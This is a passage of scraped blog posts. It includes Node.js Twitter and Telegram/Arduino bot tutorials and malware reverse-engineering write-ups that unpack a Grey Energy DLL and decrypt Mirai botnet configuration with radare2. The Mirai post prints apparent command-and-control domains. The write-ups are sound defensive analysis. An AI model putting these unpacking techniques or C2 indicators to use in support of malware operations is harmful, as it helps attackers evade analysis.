(job, done) { var content = job.data; uploadRemoteMedia(twitter, content.url) .then(function(bodyObj) { const newString = sw.removeStopwords(content.title.split(' ')) if (newString.length &gt; 0) { // hashtagging the word that are not in stopword let already = {}; for (let i = 0; i &lt; 3; i++) { let replace_word = newString[_.random(0, newString.length)] if (!already[replace_word]) { content.title = content.title.replace(replace_word, '#' + replace_word) } already[replace_word] = true; } } let status = { status: content.title, media_ids: bodyObj.media_id_string // Pass the media id string }; twitter.post('statuses/update', status, function (error, tweet, response) { if (error) { console.log('tweeting error'); } else { console.log('tweeted'); } done(); }); }) .catch(function (err) { console.log('upload err', err); done(); })}) uploadRemoteMedia is helper method to upload image URL directly to twitter without downloading it to the local system then again upload it to twitter. It uses twitter stream API to stream the media content. Code for the function is in this link. Once we have a follower it would be nice to greet the follower with a message like Nice meeting to you virtually. This will make our Bot a little interactive rather than just sitting passively and tweeting memes. There is twitter stream API which can help us achieve this functionality. Here is the snippet of the code which will help us achieve that 1234567891011121314151617181920var stream = twitter.stream('user'); stream.on('follow', function (stream_event) { console.log('Someone just followed us'); var user_name = stream_event.source.screen_name; var tweet = { status: 'Hi @' + user_name + ' ! Nice to meet you virtually.' } twitter.post('statuses/update', tweet, function(err, data, response) { if(err){ console.log(&quot;Error tweeting&quot;); } else{ console.log(&quot;tweeted successfully&quot;); } });}); All the code we saw above is in bits and pieces, to run the project clone the github repository, edit the config file with the twitter credential’s and run npm start commands to see Bot in action. ConclusionAs we saw how easily we managed to create a bot that aggregate images from various sources and tweets it. The purpose of the bot is to automate some task in our case we were aggergating memes you could do something other sorts of automation like aggregating feeds from various news sites or posting links of top Hacker news posts etc. Possibilities are limitless. Useful links Link to github repository Twitter Dev portal Twitter API Documentation Twit docs Bull docs","link":"/2017/07/31/twitter-bot-in-4-simple-steps/"},{"title":"Unpacking Grey Energy malware (Service Application DLL)","text":"Recently I stumbled upon malware sample which was part of Grey Energy malware campaign targeting Ukraine energy infrastructure. I ran the hash of the file on virutotal and many of the antiviruses tagged it Grey Energy and I tried to do a little more internet research but didn’t find and analysis on it. As there was no post on this sample so I decided to write one.In the post you will learn the following: How to debug Windows Service Application DLL Learn how to use a EBFE debugging technique Unpacking a DLL binary How to dump an unpacked in-memory executable File hash : 15a6f734ca79efc027000dd12f4d3870ccc9f604517b0e700c05b961659308d1 Identifying the MalwareUsing some basic static analysis tool you can know that it’s a 64-bit Windows DLL. Since it’s a DLL there we need to see the export table. There was only one function that was exported which is ServiceMain. This is the method is usually exported by Windows Service Application DLL. This is the function which is invoked when a request is made to the Windows Service Application. Checking the Import section you can see the below DLL been imported. But as we see the further analysis, not all the DLL which are imported are in use. Brief Introduction To Windows Service ApplicationIf you know already know about Windows Services then I would advise you to skip this section. I will describe all the necessary stuff about Windows Service from malware authors perspective, but if you are interested to know more about it then you can refer to links in the reference section at the end of this post. What is a Windows Service?Windows Service Application is to create long-running background application which you can start automatically when the system boot/reboot and it doesn’t have any user interface. Services can be put in the various state like start, stop, paused, resume and restarted, all this is managed by Windows Service Controller(services.exe). These features make it ideal for use as malware which does all its working in the background and its also long running starts on reboot. Actual use cases of Services are like Web Server service, logging machine performance metric like CPU, RAM etc. Service executable can be a DLL program with a defined entry point. A service may be written to run as either a stand-alone process or as a part of the Service Control Manager’s(svchost.exe) process (which creates a thread per service, and the service is allowed to create more threads). If the service runs in SC, the SC creates the thread for a service then loads its DLL, and calls the Service entry points to move the service through its states (first start, then eventually stop). Since creating a thread from the svchost.exe process(a system service) giving it system privileges which can be dangerous, but you can run the DLL in the specific security context of the user account that can be different from logged-on user. Service Application requires the following items:To create a Service DLL you need to satisfy specific requirement which is as follows : Main Entry point: this is required to register your service by calling StartServiceCtrlDispatcher this will be the DLL entry point. Service Entry point: which is ServiceMain in the DLL export entry, task to this function is as following tasks: Initialize any necessary items which we deferred from the DLL Entry Point.Register the service control handler which will handle Service Stop, Pause, Continue, Shutdown, etc control commands. Set Service Status to SERVICE_PENDING than to SERVICE_RUNNING. Set status to SERVICE_STOPPED on any errors and on exit. Perform startup tasks. Like creating threads/events/mutex/IPCs/etc. Service Control Handler: The Service Control Handler was registered in your ServiceMain Entry point. Each service must have a handler to handle control requests from the SCM. This handler will be called in the context of the SCM and will hold the SCM until it returns from the handler. Service Handler is called on various events like start, stop, paused etc which is passed as the parameter to the handler function. Basic Static AnalysisWe start with doing static analysis on the DllEntry point this might be the first function which might get executed even before ServiceMain. Below is the disassembly of the DllEntry point. Looking at the disassembly further there was some memory allocation and manipulating of that memory. There was another interesting function which is found was at address 0x2c0202bc, this function was called after allocation of memory which seems to be like a decryptor function, or at least preparing for so decryption. Below is the disassembly of this function. As there are a couple of XOR operations whose value is picked from register rsp+0x68 and after some manipulation data is written to [rbx+rsi*2] translate to the same address. We can verify this in dynamic analysis. I am at this point little suspicious that the executable is packed as not many functions were recognized by both IDA and radare2 analysis. Let us have look at the disassembly of the ServiceMain. These instruction doesn’t seem to make any sense. This further confirms our doubt of packed executable. We can use radare2 entropy calculation function to check the entropy if each segment in the execute. If there is any segment with high entropy then it means that section holds the encrypted data. We can use radare2 iS entropy command to calculate the entropy of each segment, below is the result of the command. As you can clearly see that .text segment has very high entropy compared to other segments. This confirms our suspicious of packed executable. In the next sections, we will try to setups debugging environment for Service Application as it is not as straight forward as other windows application and extract the unpacked executable using dynamic analysis. How to debug a Service Application DLLIf this would have been a normal DLL we could just used Immunity debugger to do debugging but Service Application DLL is different as they have to register themselves and declare their state as running within first few seconds of execution, and also before running the main entry point the Service Control Manager(SCM) should be aware that the Service is going to run and the DLL runs only in the context of the SCM. So the challenge is that we cannot get hold of the DLL entry point with ad debugger. We could overcome this limitation if we could manage to pause the execution of the DLL entry point when the SCM run the DLL. After doing some research I came across a technique called EBFE, you can read more about on this link. In this technique, we insert an infinite loop at the point we want to insert the breakpoint, once the thread executes this instruction it puts it in an infinite loop. EBFE is a jump instruction code which points to itself, this will put the executing thread in an infinite loop and then we all the time in the world to attach the debugger to the process and start debugging the process. Next question is how will we know which subprocess spawned by SCM should we attach the debugger to? It’s actually very simple, once the CPU executes the infinite loop instruction the CPU consumption value will rise to very high-value something like 90-100%. We can use process explorer one of the System Internal tools to get the process ID of the process. As you can see in the image above once the CPU executes EBFE instruction it goes in an infinite loop which increases the CPU consumption to 95-100% which is the indicator that our process is ready to be attached. Now that we have figured out how to attach the debugger to Service Application, next thing is we have to place this instruction at a point which will get executed which is the entry point of the DLL. There are two points of interest at which we are can place EBFE are, ServiceMain(Service entry point) and DllEntry (DLL entry point). We will place this EBFE instruction on both of these functions. Before replacing the two-byte instruction you will have to take note of the original two bytes which you are replacing. Once the hit the infinite loop we will replace it with the original bytes and continue debugging. Dynamically unpacking the packed codeLet us start with analyzing DllEntry point since out of those two functions only this function had some sensible code. First, the memory is allocated for the size of the original executable, the way it allocates the memory is something weird, it specifies the base address of memory block it wants to allocate, if it fails then it iterates from 100000h at the interval of 10000h tries to allocate the memory. We will have to note down this address as the unpacked executable will be on this address. then it changes the memory permission of the allocated memory and copies each segment (.text, .rdata, ) to newly allocated memory. then it patches the current DLL entry point with the DllEntry point function in unpacked code. Before patching the memory address it changes the memory permission to writable then restore it back to Read and Execute. It then iterates the Import Address Table(IAT) of the unpacked DLL and it loads the DLL present in the IAT and resolves the imported functions and patches it in the table. this is the stage at with code is unpacked and the IAT is resolved next the code jump to the original DllEntry point for execution. Dumping the unpacked codeThe memory address which we noted earlier in the address at which the executable is unpacked as you can see in the dump below. We will use Scylla plugin which built-in in X64-dbg to dump the executable. You will have to specify the base address of the executable and the size of memory you want to use to recover the PE which you can see from the memory panel next to the address column and size of the debugger which is 23000 in our case and click the dump PE to save the executable file. Unpacked BinaryUnpacked binary basic information is as shown below Import section of the unpacked binary Some more of the import section which shows binary uses HTTP for communication with the C&amp;C We can see the registering of the service in ServiceMain function by calling RegisterServiceCtrlHandleW and SetServiceStatus, that means we can be sure it was indeed as Service Application. ConclusionWe managed to unpack the Service Application DLL, this packer was specially designed DLLs was we observed the unpacking of the binary as then patching of the DllEntry point to the original code. It was not a special anti-debug technique used in unpacking which made it very trivial which good to learn for a beginner. We also learnt how to dump in-memory binary along the way. Reference Creating Windows Service Application in C++ Windows Service Application MSDN Debugging Remote Thread with EBFE technique","link":"/2018/12/17/unpacking-grey-energy-malware/"},{"title":"when a chatbot meets arduino","text":"If you have worked with IOT projects that integrate with other web apps or any other types of system you probably must be dealing with 10 different languages and frameworks, it’s painful. It also gets chaotic to maintain the code base in different language and repository. In such areas of troubles, Nodejs/javascript gives out some ray of hope. In this post, we will create a chat bot that will be able to communicate with Arduino board and its connected sensor and this entire project will be in Nodejs just one language javascript. Nodejs is chosen because it excels at handles I/O operations. MotivationI have done a couple of chat bot projects, the amazing thing about chat bots is their ease of availability. You don’t have to install another app/plugin on your phone/computer it’s available right in your messenger app just like a jinni waiting to fulfill your wish. And I have also done some side projects on Arduino board, integrating Arduino projects with other systems can be a little tricky, you can have a sensor reading been displayed on a 16x2 LCD, that is cool but it’s can be super cool if it could be delivered in you Messenger app with so suggestions on what action could we do next like if light sensor show reading of 10% or below and its evening then turn on the light or if temperature drops below 10 C the turn on the heater etc. In this post, I have tried to mix the concept of chat bots and Arduino interacting physical world. Software required Messager platform - Telegram bot API’s are simple to use and there are nice npm modules available which can help us to do quick prototyping. Nodejs IOT framework - there are several frameworks available like breakoutjs, firmatajs and johnny-five, but I am going to use johnny-five no specific reason. Arduino IDE - Arduino Standard firmware is not going to work with the johnny-five library, we need StardardFirmataPlus Arduino firmware to communicate with the johnny-five library. johnny-five uses Firmata protocol to communicate with the microcontroller, I will get back to this in the later part of the post. Hardware required Arduino Uno Light dependent resistor Breadboard Jumper wires Plan of the post is not to create some sophisticated hardware application but just to illustrate the concept, so one sensor is enough for that. Basic project setupWe are going to use a couple of Nodejs packages which are : johnny-five - IOT framework as discussed before. node-telegram-bot-api - High-level wrapper for Telegram bot API’s that takes care of message polling etc, and give nice callback function just to deal with the incoming messages. To setup the project execute the commands below 1234mkdir iot-bot &amp;&amp; cd iot-bot;npm init -ynpm install --save johnny-fivenpm install --save node-telegram-bot-api Setting up Arduino for johnny-fiveTo use johnny-five with Arduino we have to upload StandardFirmataPlus firmware to Arduino. So what exactly is StandardFirmataPlus again? In simple terms it’s a general purpose sketch which you don’t program the explicitly sketch to read/write data for particular pins instead, the sketch is programmed to read commands from the host computer to which Arduino is connected and execute it. The command could be writing/reading data to/from Arduino pins. All this is done with a Firmata protocol. It is contrary to the traditional Arduino sketch we write that has all the logic on how to deal with sensor data. Logic is moved to the host computer instead, and a general purpose sketch is uploaded to Arduino that just knows how to deal with I/O pins. To install StandardFirmataPlus firmware go to File &gt; Examples &gt; Firmata &gt; StandardFirmataPlus it will open up Arduino sketch upload the sketch to Arduino board. To test if everything went right execute the below javascript code on your host computer to which Arduino board is connected and you should get Board is ready printed on your terminal. 123456var five = require(&quot;johnny-five&quot;);var board = new five.Board();board.on(&quot;ready&quot;, function() { console.log(&quot;Board is ready&quot;)}); Arduino Schematic diagram Getting console greeting is not enough, follow the below schematic to connect a light dependent resistor with Arduino board, javascript code below we will read the value of light sensor data from pin A0 and print it on the console. 123456789101112131415161718192021222324252627var five = require(&quot;johnny-five&quot;);var board = new five.Board();board.on(&quot;ready&quot;, function () { console.log('Board is ready') // read the sensor data from analog pin 0 var light = new five.Light(&quot;A0&quot;); // change event is fired when there is a change in // value of the pin light.on(&quot;change&quot;, function () { console.log(this.level); }); /** * if the pin reading is between 10% to 30% * then there is definitely some strong light * source in the room. * the callback function is called if the pin * value is between range specifed below * late we will laverage this function for * chatbot notification */ light.within([0.10, 0.30], function () { console.log('Lights are on') });}); Setting up Telegram BotTill now we have handled the Arduino side of the project, we have to manage to pull the sensor data from Arduino into our Nodejs code, next we have to send it to Telegram messenger. But first, we have to setup Telegram bot. You need Bot token to use Telegram bot API’s you can follow this official post on how to create a bot and get bot token. Once you have the bot token lets verify that you got things right, execute the javascript code below and fill the token variable with the bot token which you bot from @BotFather. 123456789101112131415var TelegramBot = require('node-telegram-bot-api');// paste the bot token you receive from @BotFathervar token = 'YOUR_TELEGRAM_BOT_TOKEN';var bot = new TelegramBot(token, {polling: true});// Listen for any kind of message.bot.on('message', function(msg) { // we will need chat id if we want to push the message var chatId = msg.chat.id; console.log('Chat id of user : ', chatId); // echo back the message bot.sendMessage(chatId, 'Got it chief!');}); Hooking up Arduino with Chat BotNow that we are through with different components of the project it time that we hook everything together. The bot will send a notification to you if the value of the light dependent resistor is between 10% to 30 %. This range value (10-30%) was the reading of the sensor when the light was on in my room, so that’s what I am using, you can change it to any other value that suits your environment, threshold value depends lots of factor like the distance between the light source and the sensor so the value might differ for your settings. Another functionality will be reading light sensor value on when asked for, this can be done simply by storing the value of the sensor in the variable when a change event is fired this way we have the last changed value of light sensor, and when user ask’s for sensor reading send the value of the variable. To receive notifications you have to subscribe by sending /subscribe command to the bot, if you interested to know the value of the sensor right away then type /light command and if you don’t want to receive the notification then type /unsubscribe. Telegram bot platform has commands functionality inbuilt so UI dropdown list shows up so you don’t have to type the whole word. And as you might have noticed commands starts with / which is also part of bot platform. The bot will send push message when the sensor value is within range. Bot commands summary : /light - Read the current value of light sensor /subscribe - Subscribe to list of user getting notifications. /unsubscribe - Unsubscribe to notifications if not interested. Below is the code for what we have discussed so far 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var five = require(&quot;johnny-five&quot;);var TelegramBot = require('node-telegram-bot-api');var token = 'YOUR_TELEGRAM_BOT_TOKEN';// fill this variable with the chatId of the use you want// to send the message tovar chatIds = [];var lightSensorValue = 0;var board = new five.Board();var bot = new TelegramBot(token, { polling: true});// send message to who so every ask for the valuebot.onText(/\\/light/, (msg, match) =&gt; { var chatId = msg.chat.id; bot.sendMessage(chatId, 'Light is at ' + (lightSensorValue * 100) + '%');});// subscribe to the list of users who wish to recieve light notificationsbot.onText(/\\/subscribe/, (msg, match) =&gt; { var chatId = msg.chat.id; var index = chatIds.indexOf(chatId); if(index == -1){ chatIds.push(chatId); bot.sendMessage(chatId, 'You will recieve light notifications ;)'); } else { bot.sendMessage(chatId, 'You are already subscribed!'); }});// unsubscribe the notificationsbot.onText(/\\/unsubscribe/, (msg, match) =&gt; { var chatId = msg.chat.id; var index = chatIds.indexOf(chatId); if(index != -1){ chatIds.splice(index, 1); bot.sendMessage(chatId, 'You have successfully unsubcribed.'); } else { bot.sendMessage(chatId, 'You are are not subscribed.'); }});/** * if the value of sensor is within range then * too many messages might get pushed in short span * of time to avoid this below logic has been included * to make sure that there is at least 10 min interval between * two notifications */var spamControlOn = true;setInterval(function () { spamControlOn = true;}, 1000 * 60 * 10)board.on(&quot;ready&quot;, function () { console.log('Board is ready') var light = new five.Light(&quot;A0&quot;); light.on(&quot;change&quot;, function () { lightSensorValue = this.level; if (five.Fn.inRange(this.level, 0.10, 0.30)) { if (spamControlOn &amp;&amp; chatIds.length &gt; 0) { chatIds.forEach(function (chatId) { bot.sendMessage(chatId, 'Light is : ' + (lightSensorValue * 100) + '%'); }); spamControlOn = false; } } });}); This small project we did it too simple but it was just to illustrate the concept nothing serious project was intended. But now that you have tools you could develop something more sophisticated by mashing up many sensors like temperature sensor, relay circuit etc. You could display Telegram message send by the user to 16x2 LCD display connected to Arduino sitting in your kitchen possibilities are limitless. ConclusionAs you saw we implemented chat bot interacting with Arduino in few lines of code. All though the project is very simple, it’s clear that you don’t need to learn another language to program Arduino javascript is enough. Our entire project was in Nodejs but you could use any language of your choice, as there are Firmata protocol client libraries for many languages and also it’s not difficult to make Telegram bot REST API calls from the language of your choice you might even find a GitHub library for that as well. Happy Hacking! Useful links Link to the source code used in this post List of Firmata client libraries Firmata protocol documentation Creating telegram bot Node telegram library documentation johnny-five library documentation","link":"/2017/08/20/when-a-chatbot-meets-arduino/"},{"title":"Decrypting Mirai configuration With radare2 (Part 1)","text":"This is the second part of the three-part series about code Emulation for Reversing Malware :Part 1 describes how to use radare2 function emulation along with an exercise of cracking password of function implemented using radare2 python scripting plugin r2pipe.Part 2 describes how to use the feature to decode a configuration of a Mirai IOT botnet, by implementing the solution in radare python scripting capabilities.Part 3 improves the script created in the previous by adding more features of searching for addresses of encrypted string and creating function signature to search for decryption function instead of using the hard-coded address of the function. In the previous post we looked at how to we can use partial code emulation to decrypt a string in a binary. In this post we will take an example of a popular Linux IOT malware Mirai, the reason for choosing this particular malware is it stores its configuration like CNC server, port etc in encrypted form. Mirai botnet is cross-architecture so for this post we will reverse the x86 architecture version of the binary. The main goal of this post is to automate the configuration decryption using radare2. We will also use radare2 for static analysis of the binary and to reverse a little bit of decryption function. To those who have not of the heard about Mirai before, it’s IOT botnet which infects the networked Linux devices once it has installed itself it then uses the infected device as DOS attacking medium. This malware can be cross-compiled across different architecture such as x64, SPARC, MIPS, ARM etc. Another dangerous aspect of this Malware is that the author has released the source code due to which there are lots script-kiddies using this malware either as its or they are developing a variant of it. This another reason if felt the need to create the script to automation the decryption of configuration. You can find the source of the malware on this GitHub repository. Malware FileI am using following files for this analysis, Surprisingly this sample was using the same source code which I pointed out earlier. But for the rest of the post, we will analyze the binary as if didn’t have the source code. File SHA 1 hash File Name 318998d8ad1e5a9be588ecccf9713c42788c9972 mirai-telnet.x86 a7c901114b6c767562c32d30c9f6a076a380a767 mirai-ssh.x86 Find the encryption functionMalware author usually uses a very simple operation like XOR, bit shifting(SHR or SHL) or bit rotating(ROR or ROL) to encrypt strings. The algorithm is usually a combination of this operations. So to search for encryption function we can search for these instructions, radare2 has opcode search functionality you can see all the available options with /a? command. For our particular case /at xor will find all the address at which xor instruction is present, this command search a particular family of instruction like and, or, push, etc are the other family of instruction. To get the list of all family of instruction type /atl command. If you search for xor instruction you will find 226 hits and there were lots of instruction in which register as XORed with itself which is very common for normal code, this instruction is used to set the register to 0, we are looking for xor instruction whose source and destination operand is different. We can also do the similar search for shr and shl bit shift operation and ror and rol bit rotate operation. With lots of searches, there was a function starting at 0x804d680 which had a high concentration of these kinds of operation. Let reverse this function. Reversing the decryption functionLet’s try to understand the decryption function a bit about the function how it gets the input parameters, as a high-level understanding is required to understand the parameters which the function is manipulating the internally. Open the visual mode with VV command, this will the graph of the decryption function and you can toggle through different graph view by pressing p. We will use this view to understand the detail of the decryption function. This is a general pattern of string decryption functions that you can see here, first there is some setup of the string pointer, then the register which will be loaded with the decryption key, and then there will be the loop which will do the decryption of the string, there was also a crackme which I came across which first decrypted the decryption key and then the data was decrypted with that key, just another layer of protection but the technique remains the same. The decryption key may be passed through the function parameter or may be stored in the function local variable or in the global variable. Before we look into reversing the function lets try to understand radare visual mode which we are using, in particular, the graph view we are currently in. This view represents the assembly code in a graph view (like IDA) but the code is collapsed instead only this connection between different node is shown either with a red/blue/green line, each of this color has a meaning. Blue color means this jump is unconditional, green means the jump is taken if the condition is true and red means the jump is taken if the condition is false. Each node is shown with a hex value of the address of the starting of the code of that particular node, the entire address is not shown, just a small part of it is displayed. There is also some alphabet shown in the square bracket in yellow color, that is the keys you have to press to read the code of that node. So in the screen above you can press gc to see the code for **d6a0** node. If you do so that node will be shown as &lt;@@@@@@&gt;, this represents the current node whose code is displayed on the left side. This view gives us the high-level flow of the code, just by looking at this view you can see the loops and if else statement of the function. You can use arrow keys to move the graph around on the screen. Now that we know a little bit about this functionality lets use it to analyze the decryption function. Looking at the graph we can see the pattern we discussed before, first the initialization in the first two nodes on the left side and then an unconditional jump to the loop function. There is also a conditional jump on the root node if the condition is true then the jump is taken at the end of the function, this must be some sort of validation of the parameter, if the validation is true then function cannot run the decryption and if the validation is false then the function does some additional initialization and then jumps to loop (which might be the real meat). In this function you can see the initialization code in the left side, ebp, edi, esi and ebx registers are pushed on to stack and the value 0x1c is subtracted from esp, we see two things happening here, the registers are push on to stack to preserve their old value which we expect restored to old values by popping them back to the old values at the end of the function. Secondly, the subtracting of 0x1c value from the stack is done to allocate local variable in the function. we can verify this by switching to the node with [ga] you will see the assembly code of exit node as below. 1234567[0x804d66a]add esp, 0x1cpop ebxpop esipop edipop ebpret The values of the registers are popped back and the esp is torn down by adding 0x1c value. Next xor instruction sets the value of eax to zero and next the register al is set to the value of the first argument addressed by esp + 0x30 strange the function parameter is addressed using esp register rather then ebp register, this is the only parameter which is passed to the function according to the radare, we expected to pass as two parameters, string to obfuscate and the decryption key, but instead there is only one parameter which is of byte size integer which means that the value of parameter ranges from 0 to 31, the combination of previous two instruction do something really interesting, xor set the entire eax to zero and next set the lower 8-bit value to argument passed to the function. Next inst is lea ecx, [eax*8 + 0x8052800], lea instruction is usually used to calculate address, this instruction is using base + index*size format of addressing, eax register is the index which is passed as parameter to the function and 0x8052800 is the base address and the size is 8 byte, this instruction reveal a lot about the configuration of the bot. First of all, the configuration is an array of a data structure of size 8 byte ( maybe the structure has two members of size 4 byte) the base address of the structure and the indexing is pretty clear. Next inst mov eax, dword [0x80526fc] loads the value at address 0x80526fc into EAX this instruction is not clear for now, next few instruction might help use. Next instruction is comparison the cmp word [ecx + 4], 0, ecx was loaded with the address of data structure and ecx + 4 is the second member of structure which is of size word (2 bytes) and is compared with zero and if it’s zero then jumps to exit node of the function. Next, let’s look at the false branch [gc] of the comparison instruction. 1234567890x804d620 [gc]mov edi, eaxmov esi, eaxmov ebp, eaxxor edx, edxshr eax, 0x18shr edi, 8mov byte [esp], alshr esi, 0x10 On this node copies of eax register is made onto other registers edi, esi and ebp register and later bit shift right operation of 8, 0x18 and 0x10 are performed respectively. EAX register as we can understand so far here is that another data in been used in this function which is not clear what it is. Lower 8 bits of EAX register(AL) are copied on the top of the stack. Moving on to the next node [gd]. On this node there are lots of xor instruction, this is probably the real meat of the function as we can see the last instruction which is a comparison instruction who’s true branch go to the starting of this same node and the false branch exist the function. The ecx register is not changed so far in the register which to recall is loaded with the base address of the struct of 8 bytes. The first instruction this node moves the value of pointing by ecx into ebx, this first member of the struct seems to be a pointer, maybe a char pointer (char*). Next the copy of the ebx register is made into eax, next eax and edx (which is 0 at this point) is added to eax and result is stored in eax and ebx is loaded with ebp which is the copy of data at address 0x80526fc(may be a key) and then xor byte [eax], bl instruction value at address eax is xored with bl register and value is stored back at the address pointed by eax register. So far we can make a safe assumption that value at address 0x80526fc is the key which is used for decryption. Rest of the instruction in this node are all based on register, no other other external data is loaded. We should now look for the termination condition of this loop, in the end, the node eax register is compared with edx register. EDX is not changed to any other value before except for increase itself by 1, edx register was earlier set to zero we can say that edx is the counter of the loop. The counter is compared with eax register which is set to value pointed by ecx + 4 if you recall ecx register is not altered to any other value is still holds the base address of the data structure, eax register is set to the second member of the struct and then it is compared with 0xffff which means the upper 16 bits of the eax register is set to 0 which is another hint the 2nd member of struct is 2 byte, which we can conclude that 2nd member is the length of the string we want to decrypt which of 2 bytes. Lets not reversed this function any further and let us see if we can get any meaningful results out of this to understand so far if we fail we come back at this function and reverse it further. Emulating the decryption functionNow that we have a fair bit of understanding about the decryption function, let’s try to emulate for one string and then automate the decryption for any given string. There are a couple of conclusions that can be drawn from the reversing session before which are : We expected to get two parameters to the function decryption key and the data to decryption which is not the case. The parameter pass is in the index of the configuration the bot want to decrypt which then loads the base address of the data structure into ecx register which remains unchanged through the rest of the function. The decryption key is part of the function which is read from the global variable. Function manipulates the data structure which has two members, first member, being the char pointer to the encrypted string and 2nd member is 16-bit int member which is the length of the encrypted string. To execute the function we need to do the following : Allocate a memory and copy the encrypted string to that memory. Create the config data structure and set the first member of the address of the encrypted string which we just copied on the stack and the 2nd member is set to the appropriate length. Start the execution of the emulator from the first instruction of the function and then halt the execution at the point where the ecx is loaded with the base address of the data structure and instead set the ecx register with the address of the config data structure which we created earlier. Then continue the execution of the function until the last instruction of the function and then print the decrypted string as a null-terminated string. To get all the string in the binary we can use ps @@ str.* command. Since the string is encrypted, they might not be null terminated as during encryption the null value can be in the middle of the legitimate string and radare might fail to identify string and its proper length during auto-analysis. To mitigate this we will consider all the string of length 100 even if radare marks its less then 100 and copy the 100 bytes in the memory and then decrypt the string, but when we print the string we will print the string as a null-terminated string which can be less then 100 bytes. The string could be longer than 100 bytes, in that case, we will come back to the script and change length. For example, for we can consider anyone strings for emulation, I have considered string starting at address 0x08050ecd. Below are the radare commands to execute the emulation : s 0x804d680: Seek to the starting of the function. y 100 @ 0x08050ecd: Copy 100 bytes of the string starting at address 0x08050ecd in radare clipboard. aei ; aeim ; aeip: Initialization of emulation engine, create the memory and set the register values. Memory created starts at address 0x100000. yy @ 0x100000: This command will paste the copied data start at the address 0x100000, this is the address of the string we are going to use for emulation. wx 0x00001000 @ 0x100064: This command creates the first member of the config data structure with the address of encrypted data. The base address of the config data structure is 0x100064. The value 0x00001000 is 4 bytes for a little-endian format for 0x100000 which is the address of the encrypted string we just copied. wv 100 @ 0x100068: This command sets the 2nd member of the data structure with the length of encrypted string which is the constant value 100 for our experiment, at this point, we have created the config data structure. aecu 0x804d694: This command starts the execution of the function till the address 0x804d694, this is the point where we want to change to value of ecx register to the address of data structure. ar ecx=0x100064: Change the value of ecx register with the address of the data structure we have created above. aecu 0x0804d6f0: This command continues the execution until the end of the function. At this point, the string is decrypted and we should be able to print a null-terminated string. ps @ 0x100000 : This command print the null-terminated string starting at address 0x100000. Running this command you should be able to see the output shown below. You can even create the above commands as a macro and pass the address of the string as the parameter to the macro to see the output, copy paste the below code to create the macro. 1(mirai_decrypt flg, s 0x804d680, y 100 @ $0, aei, aeim, aeip, yy @ 0x100000, wx 0x00001000 @ 0x100064, wv 100 @ 0x100068, aecu 0x0804d694, ar ecx=0x100064, aecu 0x0804d6f0, ps @ 0x100000) The above command will create the macro named mirai_decrypt to use the macro issue the command .(mirai_decrypte ). What we just did is decryption of just one string the goal of this post was to really automate this decryption of all configuration of the bot which ideally will be a python script that takes binary as a parameter and should display the whole config. To achieve this we should create a python script using this same commands an above, python script is as below. 12345678910111213141516171819202122232425262728import r2pipeimport jsonimport sysr = r2pipe.open(sys.argv[1])r.cmd('aaa')func_start_addr = '0x804d680'# to load the appropriate value of data structure of in the registeraddr_of_halt = '0x804d694'func_end_addr = '0x0804d6f0'def emu_decrypt(str_offset, str_len=100): r.cmd('s '+ func_start_addr) r.cmd('y {} @ {}'.format(str_len, str_offset)) r.cmd('aei') r.cmd('aeim') r.cmd('aeip') r.cmd('aer') r.cmd('yy @ 0x100000') r.cmd('wx 0x00001000 @ 0x100064') r.cmd('wv {} @ 0x100068'.format(str_len)) r.cmd('aecu '+addr_of_halt) r.cmd('ar ecx=0x100064') r.cmd('aecu '+func_end_addr) return r.cmd('ps @ 0x100000)')print('String : ' + emu_decrypt('0x804d680')) This script should have the same effect as above macro you should be able to see the decrypted string printed. Next step should be to enumerate the address of all the strings and pass those address as the parameter to the emu_decrypt function. You can get the list of all strings by using ps @@ str.* command, we will use this command to get the address of all string in python code which is as follows. 1234for str_obj in r.cmd('psj 1 @@ str.*').split('\\n'): str_obj = json.loads(str_obj) dcrypt_offset = str(str_obj['offset']) print(emu_decrypt(dcrypt_offset)) Once you run the script you will the output as below. As you can see there are lots of meaningful decrypted strings and I am sure that’s not all the configuration, as there are other garbage hex value been printed. Maybe radare is not able to find all the encrypted strings as they might look completely like normal binary hex value after encryption so radare doesn’t flag them as strings, we need another way to figure out the reference to this bot configuration strings. The next problem we have to tackle the problem of finding all the address of the encrypted string, once that is done we can the python function we created above to decrypt the string. Finding those addresses was not that simple as I thought, nonetheless it helps me to discover other capabilities of radare which put to use to tackle the challenge. The output of the decryption python script is as follow. 123456789101112131415161718192021222324I@MVJLLVJMVJIOxrxxxxyxzantari.duckdns.orgOGISyourdady.duckdns.orgt/tcpttpc/cpuinfoBOGOMIPStc/rc.d/rc.local/rc.local/FTWDT101_watchdog/FTWDT101 watchdogWsGA4@F6FACDBPRIVMSGGETLOCALIPKILLATTKppp\\x15\\x09\\x0ezu9&gt;4w9=3uZxshellu9&gt;4w9=3uZxshell9=3uZxshelltc/resolv.confps-90PP2rRkIoK6qyZO166ZO166pW\\x1c\\x1d\\x0eW\\x16\\x0d\\x14\\x14xxx ConclusionI think to a certain extent we have able to accomplish the goal, we were able to decrypt the bot configuration as you would have observed some domain names and other meaningful string. But the goal is not completely achieved we will address the problem of finding the reference to the encrypted string in the next post, as it requires addition reversing of the binary. We also saw how partial function emulation can be helpful and save our time on not writing the decryption function and with a little bit of understanding of encryption function you can emulate the code and get the benefits of decryption. In the next post, we will improve the above script to find all the configuration references and decrypt it. This is GitHub link of the above python script we created, it has the full solution implemented. The sample files mentioned above are available on request to the researchers, please send me an email from your work email id to confirm your identity. Thank you for reading this post.","link":"/2018/09/03/decrypting-mirai-configuration-with-radare2-part-1/"},{"title":"Gandcrab v5.0.3 detail analysis of javascript delivery payload","text":"Recently a friend of mine shared with me a Javascript file which on execution resulted in machine been infected by GandCrab ransomeware. Initial through was that it must be the Javascript implementation of ransomeware, but assumption tuned out to be wrong, the code was actually heavily obfuscated and it dropped the actual GandCrab binary (v5.0.3) which did the encryption. The Javascript code did lots of other technology like using Powershell script and ActiveXObject in order to evade detection. Below is the detail analysis of GandCrab: The javascript code heavily relies on ActiveX technology to carry out its functionality like executing shell/powershell command and dropping files. The javascript code is also heavily obfuscated with string obfuscation techniques. To those who don’t know what ActiveX is? Its a software framework limited to Internet Explorer on Windows but you can install ActiveX plugin for chrome and Firefox. The danger of this software lies in its ability to allows access/execute data/code in the operating system outside the browser sandbox. This feature is heavily exploited by this GandCrab javascript code with appropriate browser security settings it could have been avoided. Layer One obfuscated payloadWhen the javascript script file was opened there were many variables with very lengthly values which was decrypted dynamically and obfuscated as we will progress with the analysis you will realized that there were multiple layers of obfuscation to avoided antivirus detection. The simplified code looks as shown below : 123456789101112131415161718192021// completely useless codevar gveyimd = new Date();// add some time 